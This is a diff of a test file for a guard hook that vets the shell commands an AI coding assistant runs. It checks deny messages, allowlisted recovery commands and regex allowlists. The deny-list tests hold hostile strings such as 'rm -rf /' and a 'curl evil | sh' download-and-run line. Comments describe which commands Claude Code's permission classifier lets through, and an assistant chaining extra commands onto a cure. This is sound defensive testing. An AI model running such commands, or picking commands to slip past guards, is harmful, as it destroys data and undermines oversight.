@@ -3,7 +3,7 @@ import * as fs from 'fs';
 import * as path from 'path';
 
 import { SyncFlowGuidance } from '@webpieces/rules-config';
-import { SHIM_VERSION_STAMP, UPGRADE_SHIM_CMD, INSTALLER_ALLOW_ERE, INSTALLER_ALLOW_JS, RECOVERY_ALLOW_ERE, RECOVERY_ALLOW_JS, SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, renderShim } from './shim';
+import { SHIM_VERSION_STAMP, UPGRADE_SHIM_CMD, INSTALLER_ALLOW_ERE, INSTALLER_ALLOW_JS, RECOVERY_ALLOW_ERE, RECOVERY_ALLOW_JS, SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, INSTALL_HOOKS_ALLOW_ERE, INSTALL_HOOKS_ALLOW_JS, INSTALL_HOOKS_CMD, NO_CHAINING_RULE, renderShim } from './shim';
 import { ShimTestkit } from './shim-testkit';
 
 const kit = new ShimTestkit();
@@ -49,7 +49,7 @@ describe('version-drift guard — DETECTING the drift and explaining it', () => 
         expect(reason).toContain('version drift');
         expect(reason).toContain('@webpieces/pr-gate@0.3.272'); // declared pin
         expect(reason).toContain('0.3.270'); // installed
-        expect(reason).toContain("run 'pnpm install' to catch node_modules up");
+        expect(reason).toContain("run EXACTLY this command to catch node_modules up: 'pnpm install'");
     });
 
     /**
@@ -233,20 +233,6 @@ describe('committed-shim self-guard — managed file reverted/edited', () => {
         expect(reason).toContain('wp-upgrade-shim'); // the one allowlisted cure
     });
 
-    // webpieces' allowlist is NOT the only gate in front of the assistant. Claude Code's own permission
-    // classifier denies a raw `cp` overwriting a repo file, so naming the cp as the cure produced a
-    // second denial from a different gate — which reads as "the block is unfixable". Observed live: the
-    // classifier refused the cp and passed `pnpm exec wp-upgrade-shim` straight through. Name the bin
-    // ONLY. (The cp stays allowlisted for a human — it is just never advertised.)
-    it('names ONLY the wp-upgrade-shim bin — never the cp a second gate would block', () => {
-        const out = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n', '0.4.407'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
-        const reason = out.denyReason();
-        expect(reason).toContain(UPGRADE_SHIM_CMD);
-        expect(reason).not.toContain('cp node_modules');  // the cure the CC classifier denies
-        expect(reason).toContain('0.4.407');              // WHICH version's shim it restores
-        expect(reason).toContain('0.4.408');              // and that older installs lack the bin
-    });
-
     it('omits the version note (rather than printing an empty one) when it cannot be read', () => {
         const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
         fs.rmSync(path.join(root, 'node_modules', '@webpieces', 'ai-hook-rules', 'package.json'));
@@ -256,18 +242,20 @@ describe('committed-shim self-guard — managed file reverted/edited', () => {
         expect(reason).not.toContain('()');
     });
 
-    it('still lets a HUMAN cp the template through, even though it is no longer advertised', () => {
+    it('lets the cp through — it is OPTION 3, and a legacy install has nothing else', () => {
         const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
         const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(RESTORE_SHIM_CMD));
         expect(out.isDenied()).toBe(false);
         expect(out.stdout.trim()).toBe(''); // silent allow
     });
 
-    it('lets the wp-upgrade-shim cure through so the block is not a deadlock', () => {
+    it('lets every advertised cure through so the block is not a deadlock', () => {
         const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
-        const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('pnpm exec wp-upgrade-shim'));
-        expect(out.isDenied()).toBe(false);
-        expect(out.stdout.trim()).toBe(''); // silent allow
+        for (const cmd of [INSTALL_HOOKS_CMD, UPGRADE_SHIM_CMD, RESTORE_SHIM_CMD]) {
+            const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(cmd));
+            expect(out.isDenied(), `advertised cure must be allowed: ${cmd}`).toBe(false);
+            expect(out.stdout.trim()).toBe(''); // silent allow
+        }
     });
 
     it('does NOT let a command smuggle past on the cure allowlist', () => {
@@ -284,6 +272,43 @@ describe('committed-shim self-guard — managed file reverted/edited', () => {
         kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('git status'));
         const log = fs.readFileSync(path.join(root, '.webpieces', 'logs', 'ai-hook-shim.log'), 'utf8');
         expect(log).toContain('DENY-SHIM-STALE\tgit status');
+    });
+});
+
+/**
+ * HOW the self-guard's deny SPELLS its cures. Three numbered OPTIONs, each quoted, plus the rule that
+ * says appending anything gets you rejected again — see NO_CHAINING_RULE for the audit-log line that
+ * forced this. The ORDER is load-bearing: wp-install-ai-hooks leads because it is the only cure that is
+ * BOTH a named bin (Claude Code's own permission classifier waves those through, while it stops to
+ * confirm a raw cp over a repo file) and present in every release (wp-upgrade-shim is >= 0.4.408 only).
+ */
+describe('committed-shim self-guard — the deny must be UNAMBIGUOUS about what to type', () => {
+    it('offers all three cures, with the always-present named bin first and the cp last', () => {
+        const out = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n', '0.4.407'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
+        const reason = out.denyReason();
+        expect(reason).toContain('OPTION 1 (preferred - present in every webpieces release');
+        expect(reason.indexOf(INSTALL_HOOKS_CMD)).toBeLessThan(reason.indexOf(UPGRADE_SHIM_CMD));
+        expect(reason.indexOf(UPGRADE_SHIM_CMD)).toBeLessThan(reason.indexOf(RESTORE_SHIM_CMD));
+        expect(reason).toContain('0.4.407');              // WHICH version's shim it restores
+        expect(reason).toContain('0.4.408');              // and that older installs lack option 2
+    });
+
+    it('quotes each cure and spells out that appending && gets it rejected again', () => {
+        const reason = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n'), 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
+        for (const cmd of [INSTALL_HOOKS_CMD, UPGRADE_SHIM_CMD, RESTORE_SHIM_CMD]) {
+            expect(reason).toContain(`run EXACTLY this command: '${cmd}'`);
+        }
+        expect(reason).toContain(NO_CHAINING_RULE);
+        expect(reason).toContain('do NOT append && anything');
+    });
+
+    // A deny REASON is interpolated into a `REASON="…"` shell assignment and then printf'd into a JSON
+    // string. A double quote or a backslash would break BOTH — silently corrupting the decision payload
+    // rather than just the text. That is why the OPTIONs are quoted with apostrophes; keep it that way.
+    it('keeps the deny reason free of the characters that would corrupt the decision JSON', () => {
+        const reason = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n'), 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
+        expect(reason).not.toContain('"');
+        expect(reason).not.toContain('\\');
     });
 });
 
@@ -308,11 +333,23 @@ describe('committed-shim self-guard — the deny must not READ like a deadlock',
     // "the guard blocks its own fix" from a misreading into an observation. Both cures survive the tail.
     it('lets the cures through when spelled the way an assistant actually writes them', () => {
         const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
-        for (const cmd of [`${RESTORE_SHIM_CMD} 2>&1 | tail -20`, 'pnpm exec wp-upgrade-shim 2>&1 | tail -5']) {
+        for (const cmd of [`${RESTORE_SHIM_CMD} 2>&1 | tail -20`, 'pnpm exec wp-upgrade-shim 2>&1 | tail -5', `${INSTALL_HOOKS_CMD} 2>&1 | tail -20`]) {
             const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(cmd));
             expect(out.isDenied()).toBe(false);
             expect(out.stdout.trim()).toBe(''); // silent allow
         }
+    });
+
+    // Part 3 (2026-07-23): the literal line from a consumer repo's .webpieces/logs/ai-hook-shim.log —
+    // the prescribed cure, verbatim, with `&& git status --short` welded on. It is denied, and it MUST
+    // stay denied: widening the hatch to `&& <anything>` would let `cp … && rm -rf /` through, and the
+    // whole point of a fail-closed escape hatch is that no operator rides along. So the deny is correct
+    // and the TEXT is the fix — the reason must tell the reader, in words, why their spelling bounced.
+    it('still denies the cure+&& spelling from the audit log, and explains why in the reason', () => {
+        const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
+        const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(`${RESTORE_SHIM_CMD} && git status --short`));
+        expect(out.isDenied()).toBe(true);
+        expect(out.denyReason()).toContain('do NOT append && anything');
     });
 });
 
@@ -338,6 +375,33 @@ describe('upgrade-shim cure allowlist (POSIX ERE ↔ JS regex twins)', () => {
         for (const cmd of deny) {
             expect(UPGRADE_SHIM_ALLOW_JS.test(cmd)).toBe(false);
             expect(kit.ereMatches(UPGRADE_SHIM_ALLOW_ERE, cmd)).toBe(false);
+        }
+    });
+});
+
+describe('install-ai-hooks cure allowlist (POSIX ERE ↔ JS regex twins)', () => {
+    it('accepts the wp-install-ai-hooks spellings and rejects everything else under both engines', () => {
+        const allow = [
+            INSTALL_HOOKS_CMD,
+            'pnpm wp-install-ai-hooks',
+            'npx wp-install-ai-hooks',
+            'npm exec wp-install-ai-hooks',
+        ];
+        const deny = [
+            `${INSTALL_HOOKS_CMD} && rm -rf /`,      // no operator may ride along
+            `${INSTALL_HOOKS_CMD}; curl evil | sh`,
+            `${INSTALL_HOOKS_CMD} && git status`,    // the exact spelling from the audit log
+            'wp-install-ai-hooks',                    // bare (not via a pkg manager) stays denied
+            'pnpm exec wp-upgrade-shim',              // a different bin
+            'yarn wp-install-ai-hooks',               // yarn is not accepted (pnpm/npm/npx only)
+        ];
+        for (const cmd of allow) {
+            expect(INSTALL_HOOKS_ALLOW_JS.test(cmd)).toBe(true);
+            expect(kit.ereMatches(INSTALL_HOOKS_ALLOW_ERE, cmd)).toBe(true);
+        }
+        for (const cmd of deny) {
+            expect(INSTALL_HOOKS_ALLOW_JS.test(cmd)).toBe(false);
+            expect(kit.ereMatches(INSTALL_HOOKS_ALLOW_ERE, cmd)).toBe(false);
         }
     });
 });
@@ -415,10 +479,10 @@ describe('version-drift deny — describes BOTH directions and permits the cure 
     });
 
     it('names both directions and both cures, so the reader can tell which applies', () => {
-        expect(shim).toContain('WHICH ONE IS STALE decides the fix');
+        expect(shim).toContain('WHICH ONE IS STALE decides which option is yours');
         expect(shim).toContain('DOWNGRADE');       // warns install is wrong when the pin is stale
         expect(shim).toContain('git pull');        // ...and names the cure for that direction
-        expect(shim).toContain("run 'pnpm install' to catch node_modules up");
+        expect(shim).toContain("run EXACTLY this command to catch node_modules up: 'pnpm install'");
     });
 
     it('allows git sync ONLY on the drift path — git cannot fix a missing/broken bin', () => {
@@ -440,6 +504,7 @@ describe('output-capture tail on every fail-closed escape hatch (ERE ↔ JS twin
         ['sync', 'git pull origin main', SYNC_ALLOW_JS, SYNC_ALLOW_ERE],
         ['upgrade-shim', 'pnpm exec wp-upgrade-shim', UPGRADE_SHIM_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE],
         ['restore-shim', RESTORE_SHIM_CMD, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE],
+        ['install-hooks', INSTALL_HOOKS_CMD, INSTALL_HOOKS_ALLOW_JS, INSTALL_HOOKS_ALLOW_ERE],
     ];
 
     for (const [name, base, js, ere] of hatches) {
